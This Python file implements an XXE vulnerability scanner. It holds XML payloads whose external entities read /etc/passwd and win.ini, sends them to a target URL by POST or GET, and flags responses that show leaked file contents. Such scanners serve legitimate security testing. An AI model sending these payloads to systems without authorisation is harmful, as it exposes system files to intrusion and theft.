import requests
from dataclasses import dataclass
from typing import List, Dict

@dataclass
class XXEResult:
    payload: str
    vulnerable: bool
    confidence: str
    evidence: str
    url_tested: str

class XXEScanner:
    def __init__(self, timeout: int = 5):
        self.timeout = timeout
        self.session = requests.Session()
        self.payloads = [
            """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data>&xxe;</data>""",
            """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>
<data>&xxe;</data>"""
        ]

    def analyze(self, response_text: str) -> Dict:
        evidence = []
        if "root:x:0:0" in response_text:
            evidence.append("Linux /etc/passwd contents exposed via XML Entity extraction")
        if "[extensions]" in response_text.lower():
            evidence.append("Windows win.ini contents exposed via XML Entity extraction")
        
        vulnerable = len(evidence) > 0
        return {
            "vulnerable": vulnerable,
            "confidence": "HIGH" if vulnerable else "LOW",
            "evidence": "; ".join(evidence) if evidence else "No indicators"
        }

    def detect(self, action: str, param: str, method: str = "post") -> List[XXEResult]:
        # XXE is generally sent in payload body, 
        # but here we test it passing through parameter for simplicity in this mock
        results = []
        for payload in self.payloads:
            try:
                data = {param: payload}
                if method == "post":
                    # Also set application/xml header just in case some backend picks it up
                    headers = {"Content-Type": "application/xml"}
                    response = self.session.post(action, data=payload, headers=headers, timeout=self.timeout)
                else:
                    response = self.session.get(action, params=data, timeout=self.timeout)
                
                analysis = self.analyze(response.text)
                if analysis["vulnerable"]:
                    results.append(XXEResult(
                        payload=payload,
                        vulnerable=True,
                        confidence=analysis["confidence"],
                        evidence=analysis["evidence"],
                        url_tested=action
                    ))
            except Exception:
                pass
        return results
